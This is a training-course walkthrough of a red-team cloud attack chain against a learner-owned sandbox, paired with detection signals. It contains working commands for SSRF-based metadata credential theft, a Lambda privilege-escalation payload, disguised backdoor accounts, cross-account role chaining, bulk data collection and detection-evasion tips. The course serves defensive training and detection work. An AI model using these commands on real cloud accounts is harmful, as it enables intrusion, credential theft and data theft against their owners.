# 03 — Red Variant Walkthrough

> **Level:** Advanced
> **Prereqs:** Modules 09–12
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Reconnaissance, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Impact
**Authorization scope:** Capstone labs are to be run only against learner-owned sandbox accounts. Placeholder accounts are used throughout. No live attack surfaces.

## What & why

This is the narrated killchain that the red-team learner executes against the sandbox deployed in [13-02](./deploying-the-reference-sandbox.md). Every step restates a Module 09 lesson with cross-link, placeholder commands, and expected output. The learner completes the actual wiring in [`labs/red/build-the-apt-lab.md`](./labs/red/build-the-apt-lab.md).

## The OnPrem reality

A classic internal network APT walkthrough would start with: phishing → C2 beacon → BloodHound → Kerberoast → DCSync → exfil. The cloud equivalent replaces each primitive with its managed-service counterpart: SSRF→IMDS = phishing attachment execution; assume-role chain = Kerberos delegation abuse; object-store list/get storm = SMB share enumeration.

## Killchain steps

### Cross-cloud master table

| Step | Stage | Red action | Module 09 ref | Blue control (Module 06/10/11 ref) | Artifacts left |
|---|---|---|---|---|---|
| 1 | Recon | Enumerate public resources, tenant/account IDs | [09-02](../Red-Team-Offense/recon-osint-and-fingerprint.md) | [10-04](../Blue-Team-Defense/deception-honeytokens.md) — honey-token hit | `s3:ListObjects` / `storage.objects.list` / `List Blobs` from unknown IP |
| 2 | Initial Access | SSRF→IMDS credential theft OR leaked CI key use | [09-03](../Red-Team-Offense/initial-access-vectors.md) | [06-02](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md) — `GetCallerIdentity` spike | `sts:GetCallerIdentity` from new source IP |
| 3 | Privilege Escalation | `iam:PassRole`+`lambda:CreateFunction` / Azure role elevation / GCP token creation | [09-05](../Red-Team-Offense/privilege-escalation-catalogue.md) | [06-05](../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md) — GuardDuty/Defender/SCC finding | `iam:PassRole`, `lambda:CreateFunction`, `iam:UpdateAssumeRolePolicy` |
| 4 | Persistence | `iam:CreateAccessKey` on existing user, Lambda event-source mapping | [09-07](../Red-Team-Offense/persistence-techniques-in-cloud.md) | [10-04](../Blue-Team-Defense/deception-honeytokens.md) — canary key touch | `iam:CreateAccessKey`, `lambda:CreateEventSourceMapping` |
| 5 | Lateral Movement | Assume-role chain through 3 accounts | [09-06](../Red-Team-Offense/lateral-movement-and-pivoting.md) | [06-02](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md) — cross-account `AssumeRole` | `sts:AssumeRole` across account boundaries |
| 6 | Collection | `s3:ListObjects`→`s3:GetObject` storm on data bucket | [09-09](../Red-Team-Offense/collection-data-exfil-channels.md) | [06-07](../Monitoring-Detection-SIEM/detection-as-code-sigma-and-custodian.md) — List/Get ratio anomaly | High-volume `ListObjects`/`GetObject` pairs |
| 7 | Impact | Attempt `s3:DeleteObject` on WORM-locked object → `AccessDenied` | [09-09](../Red-Team-Offense/collection-data-exfil-channels.md) | [04-04](../Storage-Data-Security/object-lock-and-worm.md) — WORM preservation | CloudTrail `s3:DeleteObject` with `errorCode: AccessDenied` |

---

### Step 1 — Reconnaissance

**Module 09 ref:** [09-02 Recon, OSINT & Fingerprint](../Red-Team-Offense/recon-osint-and-fingerprint.md)

The attacker begins by mapping the target's cloud footprint without authentication. Public object stores and tenant metadata are the first surface.

#### AWS

```bash
# Enumerate public S3 buckets from account ID
aws s3 ls s3://capstone-data-<your-sandbox-account-id> --no-sign-request

# OSINT: find account ID from IAM role ARN pattern in error messages
# Trigger a purposefully-bad request to see the error's ARN:
aws sts get-caller-identity --profile nonexistent 2>&1 | grep -oE 'arn:aws:iam::[0-9]{12}'

# cloudfox enumeration (learner installs)
cloudfox aws -p capstone-sandbox permissions --principal ci-deployer
```

**Expected output:** bucket listing shows `customer-data/` prefix; the bucket ACL reveals `public-read`.

#### Azure

```bash
# Enumerate tenant from domain
curl "https://login.microsoftonline.com/example-tenant.onmicrosoft.com/.well-known/openid-configuration"

# Discover storage accounts via DNS brute
nslookup capstonedataXXXX.blob.core.windows.net

# AADInternals — recon tenant objects (learner installs)
Get-AADIntTenantId -Domain "example-tenant.onmicrosoft.com"
```

#### GCP

```bash
# Enumerate public GCS buckets
curl "https://storage.googleapis.com/storage/v1/b/capstone-data-example-project"

# gcloud enumeration (unauthenticated)
gcloud projects describe example-project --format=json

# Discover service accounts
gcloud iam service-accounts list --project=example-project
```

#### OnPrem

```bash
nmap -sV -p 80,443,445,3389 capstone-web.lab.local
enum4linux -a capstone-files.lab.local
```

**Signals left:** `ListObjects` events in CloudTrail/Azure Diagnostics/GCP Cloud Audit Logs from an IP not associated with the organisation's egress CIDR. See [06-02](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md).

---

### Step 2 — Initial Access

**Module 09 ref:** [09-03 Initial Access Vectors](../Red-Team-Offense/initial-access-vectors.md)

Two entry paths converge here. The learner may use either (or both):

#### Path A — SSRF → IMDS credential theft

```bash
# The vulnerable web app proxies arbitrary URLs to IMDS.
# Exploit the SSRF endpoint (learner substitutes sandbox values):

# AWS — fetch role name
curl "http://<sandbox-web-ip>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response: "vulnerable-ec2-role"
curl "http://<sandbox-web-ip>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnerable-ec2-role"

# Response yields: AccessKeyId, SecretAccessKey, Token, Expiration

# Use stolen credentials
export AWS_ACCESS_KEY_ID=<stolen-key>
export AWS_SECRET_ACCESS_KEY=<stolen-secret>
export AWS_SESSION_TOKEN=<stolen-token>
aws sts get-caller-identity  # confirms foothold
```

```bash
# Azure — IMDS token theft
curl "http://<sandbox-web-ip>:8080/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"

# Response: access_token (JWT)
export AZURE_ACCESS_TOKEN=<stolen-jwt>
az rest --uri "/subscriptions?api-version=2022-12-01"  # confirms foothold
```

```bash
# GCP — IMDS token theft
curl "http://<sandbox-web-ip>:8080/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Response: access_token
export GCP_TOKEN=<stolen-token>
curl -H "Authorization: Bearer $GCP_TOKEN" "https://www.googleapis.com/oauth2/v1/tokeninfo"
```

#### Path B — Leaked CI runner credentials

```bash
# The ci-deployer key was placed in the simulated public repo.
# Locate it (learner places in their sandbox):
#   - AWS: AKIAIOSFODNN7EXAMPLE + secret in capstone/secrets/aws_ci.env
#   - Azure: ~z8Q~... client secret in capstone/secrets/azure_ci.env
#   - GCP: JSON key file in capstone/secrets/gcp_ci.json

# AWS
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=<learner-substitutes-secret>
aws sts get-caller-identity  # Account: 111111111111, User: ci-deployer
```

**Signals left:** `GetCallerIdentity` from a new, external source IP; IMDS access from the web tier may generate a GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding at `High` severity (see [06-05](../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md)).

---

### Step 3 — Privilege Escalation

**Module 09 ref:** [09-05 Privilege Escalation Catalogue](../Red-Team-Offense/privilege-escalation-catalogue.md)

The stolen EC2 role has `AdministratorAccess`. But to demonstrate escalation (and to exercise the blue detection), the learner intentionally escalates through a narrower vector: `iam:PassRole` → Lambda.

#### AWS — PassRole → Lambda

```bash
# Enumerate what the current principal can do
aws iam list-attached-role-policies --role-name vulnerable-ec2-role
aws iam get-policy-version --policy-arn <policy-arn> --version-id v1

# Discover PassRole is allowed to *
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111111111111:role/vulnerable-ec2-role \
  --action-names iam:PassRole lambda:CreateFunction

# Escalate: create a Lambda function that passes the ProdLambdaExecRole
# (which itself has AdministratorAccess) — then invoke it

# 1. Package a function that escalates
cat > escalate.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='ci-deployer',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    iam.create_access_key(UserName='ci-deployer')
    return {'status': 'escalated'}
EOF
zip escalate.zip escalate.py

# 2. Create the Lambda, passing the admin role
aws lambda create-function \
  --function-name capstone-escalate \
  --runtime python3.11 \
  --role arn:aws:iam::111111111111:role/ProdLambdaExecRole \
  --handler escalate.handler \
  --zip-file fileb://escalate.zip

# 3. Invoke — the function runs with AdministratorAccess
aws lambda invoke --function-name capstone-escalate output.json
```

#### Azure — Role elevation via managed identity abuse

```bash
# If the stolen VM managed identity has Contributor but not User Access Administrator,
# and a Function App managed identity has Owner, the attacker elevates by:
# 1. Listing available managed identities
# 2. Assigning self the higher-privilege identity's role
# (See 09-05 for complete Azure escalation matrix)
az vm identity show --name capstone-web-vm --resource-group sandbox-rg
az role assignment create --assignee <stolen-sp-id> --role Owner --scope /subscriptions/00000000-0000-0000-0000-000000000000
```

#### GCP — `iam.serviceAccountTokenCreator` abuse

```bash
# The prod-func-sa has roles/iam.serviceAccountTokenCreator
# — can impersonate any SA in the project
gcloud auth print-access-token  # current limited context

# List SAs
gcloud iam service-accounts list

# Impersonate the ci-deployer SA (Owner)
gcloud auth activate-service-account --key-file=- <<EOF
$(gcloud iam service-accounts keys create /dev/stdout \
  --iam-account=ci-deployer@example-project.iam.gserviceaccount.com)
EOF
gcloud projects get-iam-policy example-project  # now running as Owner
```

**Signals left:** GuardDuty finding `Policy:IAMUser/RootCredentialUsage` or `PrivilegeEscalation:IAMUser/AdministrativePermissions` (see [06-05](../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md)). Azure Defender for Cloud `Elevated access` alert. GCP SCC `Privilege Escalation` finding.

---

### Step 4 — Persistence

**Module 09 ref:** [09-07 Persistence Techniques in Cloud](../Red-Team-Offense/persistence-techniques-in-cloud.md)

The attacker creates durable access that survives credential rotation and instance termination.

#### AWS

```bash
# Create a backup access key on ci-deployer
aws iam create-access-key --user-name ci-deployer
# Output: { "AccessKeyId": "AKIA...BACKUP", "SecretAccessKey": "..." }

# Create a new IAM user (phoenix user — looks legitimate)
aws iam create-user --user-name monitoring-service
aws iam create-access-key --user-name monitoring-service
aws iam attach-user-policy \
  --user-name monitoring-service \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Lambda persistence: event-source mapping on a high-frequency trigger
# so attacker code re-runs periodically
aws lambda create-event-source-mapping \
  --function-name capstone-escalate \
  --event-source-arn arn:aws:dynamodb:us-east-1:111111111111:table/capstone-data/stream/2024-01-01T00:00:00.000 \
  --enabled
```

#### Azure

```bash
# Create a second service principal with Owner (backdoor SP)
az ad sp create-for-rbac --name monitoring-service --role Owner

# Create a logic app / automation runbook that re-assigns the backdoor
# role if it's ever removed (persistence via automation account)
az automation runbook create --automation-account-name sandbox-auto \
  --resource-group sandbox-rg --name persistence-runbook --type PowerShell
```

#### GCP

```bash
# Create a second service account key (backup key)
gcloud iam service-accounts keys create /tmp/backup-key.json \
  --iam-account=ci-deployer@example-project.iam.gserviceaccount.com

# Create a new SA (phoenix SA — looks like normal infra)
gcloud iam service-accounts create monitoring-service \
  --display-name "Monitoring Service Account"
gcloud projects add-iam-policy-binding example-project \
  --member="serviceAccount:monitoring-service@example-project.iam.gserviceaccount.com" \
  --role="roles/owner"
```

**Signals left:** `CreateAccessKey` event outside the CI pipeline's normal schedule (daily diff alert from [10-04](../Blue-Team-Defense/deception-honeytokens.md)). `CreateUser` / `CreateServiceAccount` events in CloudTrail/Activity Log. The `monitoring-service` user/SA name is a weak cover — UEBA from [06-09](../Monitoring-Detection-SIEM/entity-behaviour-ueba-basics.md) flags "new principal created by recently-compromised principal."

---

### Step 5 — Lateral Movement

**Module 09 ref:** [09-06 Lateral Movement & Pivoting](../Red-Team-Offense/lateral-movement-and-pivoting.md)

The capstone architecture includes a cross-account role with an overly broad trust policy (`"Principal": {"AWS": "*"}`). The attacker chains through three accounts.

#### AWS

```bash
# Step 5a: Assume the cross-account role from the production account
aws sts assume-role \
  --role-arn arn:aws:iam::333333333333:role/CrossAccountRole-SharedServices \
  --role-session-name capstone-session
# Sets new env vars

# Step 5b: From SharedServices, assume the Staging role
aws sts assume-role \
  --role-arn arn:aws:iam::222222222222:role/StagingDeployRole \
  --role-session-name capstone-session-2

# Step 5c: Back to Prod via the symmetric trust
aws sts assume-role \
  --role-arn arn:aws:iam::111111111111:role/ProdSupportRole \
  --role-session-name capstone-final
# Now in Prod with a different role — bypasses simplistic "deny ci-deployer" revocations
```

#### Azure

```bash
# Cross-subscription lateral movement
# The ci-deployer SP has Owner on sub A. If it also has permissions on sub B:
az account set --subscription 00000000-0000-0000-0000-000000000001  # subscription B
az role assignment list --assignee <ci-sp-object-id>
az rest --method get --uri "https://management.azure.com/subscriptions/00000000-0000-0000-0000-000000000002/resources?api-version=2021-04-01"
```

#### GCP

```bash
# Cross-project lateral movement
gcloud config set project shared-services-project
gcloud iam service-accounts list

# Impersonate an SA in the shared project
gcloud auth activate-service-account \
  --key-file=<(gcloud iam service-accounts keys create /dev/stdout \
    --iam-account=sa-shared@shared-services-project.iam.gserviceaccount.com)
```

**Signals left:** `sts:AssumeRole` from an IP not associated with normal automation. The role chain creates distinct `userIdentity` entries in CloudTrail with `sessionName: capstone-session` — the naming pattern diverges from legitimate sessions (e.g., `AWSCloudFormation`). See [06-02](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md).

---

### Step 6 — Collection / Exfiltration

**Module 09 ref:** [09-09 Collection & Data Exfil Channels](../Red-Team-Offense/collection-data-exfil-channels.md)

The attacker enumerates and downloads object store contents. The capstone *stops short of real exfiltration* — data is written to a local artifact only.

#### AWS

```bash
# List all objects in the data bucket
aws s3 ls s3://capstone-data-111111111111 --recursive

# Download all objects to local staging
mkdir -p /tmp/capstone-exfil
aws s3 sync s3://capstone-data-111111111111 /tmp/capstone-exfil/

# Stage for "exfil" — in the capstone, this goes to localhost
python3 -c "
import json
# Log exfil-complete to local artifact only
with open('capstone/red-evidence.jsonl', 'w') as f:
    f.write(json.dumps({'stage': 'exfil', 'bytes': 123456, 'status': 'staged-local'}))
"
```

#### Azure

```bash
# List blobs
az storage blob list --account-name capstonedataXXXX --container-name public-data --output table

# Download
az storage blob download-batch --destination /tmp/capstone-exfil \
  --source public-data --account-name capstonedataXXXX
```

#### GCP

```bash
# List objects
gsutil ls -r gs://capstone-data-example-project/

# Download
gsutil -m cp -r gs://capstone-data-example-project/ /tmp/capstone-exfil/
```

**Signals left:** High ratio of `GetObject` to `ListObjects` calls over a short window, from a single session. In CloudTrail, the `sourceIPAddress` is consistent with the compromised principal. S3 data events (if enabled per [06-02](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md)) show `bytesDownloaded` field. Storage firewalls in Azure and VPC Service Controls bypass in GCP leave `storage.objects.get` audit entries.

---

### Step 7 — Impact (Attempted Destruction)

**Module 09 ref:** [09-09 Collection & Data Exfil Channels](../Red-Team-Offense/collection-data-exfil-channels.md) (destruction variant)

The attacker attempts to cover tracks by deleting data. The WORM bucket defeats this, producing a denied API call — a valuable detection signal.

```bash
# Attempt delete on WORM-protected object
aws s3 rm s3://capstone-data-111111111111/customer-data/records.json
# Response: An error occurred (AccessDenied) when calling the DeleteObject operation:
#   Access Denied — Object Lock retention prevents deletion

# Azure
az storage blob delete --account-name capstonedataXXXX --container-name immutable-records \
  --name records.json
# Response: (403) This operation is not permitted as the blob is immutably locked.

# GCP
gsutil rm gs://capstone-worm-example-project/customer-data/records.json
# Response: AccessDeniedException: 403 Object is under retention policy
```

**Signals left:** CloudTrail `s3:DeleteObject` with `errorCode: AccessDenied` and `errorMessage` containing "Object Lock." This is a high-confidence signal: legitimate automation rarely attempts deletion of Object-Locked blobs. See [04-04](../Storage-Data-Security/object-lock-and-worm.md).

## 🔴 Red Team view

### Signal awareness at each step

| Step | Signal produced | TTL | Evasion possible? (09-08 ref) |
|---|---|---|---|
| Recon — public bucket listing | `ListObjects` from unknown IP | ~15 min to SIEM index | Use Tor/VPN exit nodes; slow-rate enumeration |
| SSRF→IMDS | IMDS access pattern (multiple metadata paths in rapid succession) | Real-time if GuardDuty enabled | Use SSRF with throttling; token reuse avoids repeated IMDS hits |
| PassRole→Lambda | `lambda:CreateFunction` then `lambda:InvokeFunction` within seconds | ~5–10 min (CloudTrail delivery delay) | Create function during maintenance window; name it something innocuous |
| Persistence — CreateAccessKey | `CreateAccessKey` event | ~15 min | Create during CI runner's normal run window; use `UpdateAccessKey` to reactivate deactivated key |
| Lateral — AssumeRole chain | 3x `AssumeRole` with different account IDs | ~15 min (cross-account propagation) | Use `RoleSessionName` that matches CloudFormation pattern (`AWSCloudFormation-*`) |
| Collection — GetObject storm | High-volume read pattern | ~5 min to anomaly detection | Spread across 24h; throttle to match normal backup schedule |
| Impact — DeleteObject denied | Denied API call (rare, low-noise) | ~2 min | No evasion — the deny is the signal |

The capstone intentionally skips evasion (see [09-08](../Red-Team-Offense/evasion-and-trail-free-actions.md)) so the blue variant has clean signals to detect. In a real engagement, every step would incorporate trail-free techniques.

## 🔵 Blue Team view

Each red stage maps to a specific detection lesson:

| Red stage | Blue detection lesson | Detection rule ID in [detections pack](./detections/capstone-detection-pack.md) |
|---|---|---|
| Recon | [10-04 Deception / Honeytokens](../Blue-Team-Defense/deception-honeytokens.md) | `CAP-RECON-01` |
| Initial Access | [06-02 CloudTrail Activity & Data Events](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md) | `CAP-IA-01` (SSRF IMDS), `CAP-IA-02` (leaked key) |
| Privilege Escalation | [06-05 Native Threat Detection](../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md) | `CAP-PE-01` (PassRole) |
| Persistence | [10-04 Deception / Honeytokens](../Blue-Team-Defense/deception-honeytokens.md) | `CAP-PER-01` (CreateAccessKey) |
| Lateral Movement | [06-02 CloudTrail](../Monitoring-Detection-SIEM/cloudtrail-activity-and-data-events.md) | `CAP-LM-01` (cross-account AssumeRole) |
| Collection | [06-07 Detection-as-Code](../Monitoring-Detection-SIEM/detection-as-code-sigma-and-custodian.md) | `CAP-COLL-01` (List/Get storm) |
| Impact | [04-04 Object Lock & WORM](../Storage-Data-Security/object-lock-and-worm.md) | `CAP-IMP-01` (DeleteObject denied) |

## Hands-on lab

Complete [`labs/red/build-the-apt-lab.md`](./labs/red/build-the-apt-lab.md) to execute this killchain step-by-step against your sandbox.

## References

- [Module 09 — Red Team Offense](../Red-Team-Offense/README.md)
- [Module 06 — Monitoring & Detection](../Monitoring-Detection-SIEM/README.md)
- [Module 10 — Blue Team Defense](../Blue-Team-Defense/README.md)
- [13-02 — Deploying the Reference Sandbox](./deploying-the-reference-sandbox.md)
- [labs/red/build-the-apt-lab.md](./labs/red/build-the-apt-lab.md)
- MITRE ATT&CK Cloud Matrix: Initial Access (T1190, T1078), Privilege Escalation (T1098, T1078), Persistence (T1098, T1136), Lateral Movement (T1550), Collection (T1530)
